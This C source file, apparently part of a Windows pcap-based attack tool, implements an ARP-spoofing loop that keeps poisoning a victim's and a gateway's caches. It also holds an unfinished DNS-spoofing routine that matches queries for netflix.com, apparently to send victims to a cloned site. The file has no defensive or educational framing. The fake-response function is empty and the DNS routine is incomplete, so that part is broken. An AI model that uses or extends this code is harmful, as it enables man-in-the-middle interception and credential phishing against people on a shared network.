#define _CRT_SECURE_NO_WARNINGS
#define _WINSOCK_DEPRECATED_NO_WARNINGS

#include "spoof.h"

#define KEYWORD_SIZE 2

u_long fake_web = 1111; // TODO 

extern send_params infect_params;
static char* keywords[] = {"www.netflix.com", "netflix.com"};

DWORD WINAPI start_arp_spoofing(LPVOID lparam)
{
	int pack_size = sizeof(ether_hdr) + sizeof(arp_ether_ipv4);

	u_char victim_packet[sizeof(ether_hdr) + sizeof(arp_ether_ipv4)];
	u_char gateway_packet[sizeof(ether_hdr) + sizeof(arp_ether_ipv4)];

	/* build the packets */
	build_packet(
		victim_packet,
		htonl(infect_params.gateway_ip),
		htonl(infect_params.victim_ip),
		infect_params.adapter->Address,
		infect_params.victim_mac,
		2 
	);

	build_packet(
		gateway_packet,
		htonl(infect_params.victim_ip),
		htonl(infect_params.gateway_ip),
		infect_params.adapter->Address,
		infect_params.gateway_mac,
		2
	);

	int condition = 1;
	while (condition)
	{
		pcap_sendpacket(infect_params.fp, victim_packet, pack_size);
		pcap_sendpacket(infect_params.fp, gateway_packet, pack_size);
		Sleep(2000); 
	}
	return 0;
}

/*
* @purpose: changes the answer section of the DNS packet.
* @params:	packet - the packet to be changed.
*			pAnswer - pointer to the answer section.
*			pQue - pointer to the question string (response packet).
* @return:	the pointer to the end of the function.
* 
*/
void* create_fake_dns_respones(u_char* const packet, void* const pAnswer, void* const pQuestion)
{
	/* locals */
	


	
}

/*
* @purpose: Checks if a DNS packet is intended for the specific cloned website.
* If so changes the packet for DNS hijacking.
* @params: packet - the network packet
* @return: size of new packet (same size if not the DNS)
* 
*/
size_t dns_spoofing(u_char* packet, size_t packet_size)
{
	/* check if valid DNS packet */
	ether_hdr* eth_header = (ether_hdr*)packet;
	ip_hdr* ip_header = (ip_hdr*)(packet + sizeof(ether_hdr));
	udp_hdr* udp_header = (udp_hdr*)(packet + sizeof(ether_hdr) + sizeof(ip_hdr));
	uint16_t questions;

	if (eth_header->frame_type != htons(NETWORK_IPv4) // ipv4
		|| ip_header->protocol != TRANSPORT_UDP // udp port
		|| udp_header->src_port != htons(53)) // dns port
		return packet_size;
	
	dns_hdr* dns_header = (dns_hdr*)(packet + sizeof(ether_hdr) + sizeof(ip_hdr) + sizeof(udp_hdr));
	u_char* dns_data = (u_char*)dns_header + sizeof(dns_hdr);
	void* const temp_p = (void*)dns_data;
	questions = htons(dns_header->questions);

	for (size_t i = 0; i < questions; i++)
	{
		for (size_t key = 0; key < KEYWORD_SIZE; key++)
			if (!strcmp(keywords[key], dns_data))
			{
				
			}
		dns_data += strlen(dns_data) + 5; // point to the next question
	}
	
	
}
